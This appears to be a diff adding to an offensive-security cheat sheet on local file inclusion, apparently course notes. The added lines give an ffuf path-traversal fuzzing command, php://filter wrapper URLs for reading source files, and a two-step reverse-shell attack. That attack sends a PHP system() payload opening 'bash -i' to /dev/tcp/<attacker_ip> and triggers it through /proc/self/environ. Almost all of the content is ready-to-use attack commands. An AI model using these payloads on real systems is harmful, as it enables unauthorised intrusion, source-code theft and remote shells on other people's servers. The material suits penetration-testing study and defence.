@@ -130,4 +130,36 @@ Fuzz Server Logs and Configs
 
 Fuzz Webroot
 
+fuzz for index.php use wordlist for Linux or wordlist for windows, or this general wordlist alternative; consider that depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.
+
     /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt
+
+Example: 
+
+    ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+## LFI Wrappers
+
+### 1) Base64 encode a file
+
+    http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>
+
+Decode
+
+    echo "BASE64" | base64 -d
+
+### 2) ROT13 encoding
+
+    http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>
+
+## Reverse Shell via LFI
+
+Inject a shell using /proc/self/environ. If the environment variables are writable, inject PHP code into the environment.
+
+#### 1. Send PHP payload
+    
+    curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ
+
+#### 2. Access the file via LFI to trigger the reverse shell
+
+    http://<target_url>/file.php?recurse=../../../../../proc/self/environ
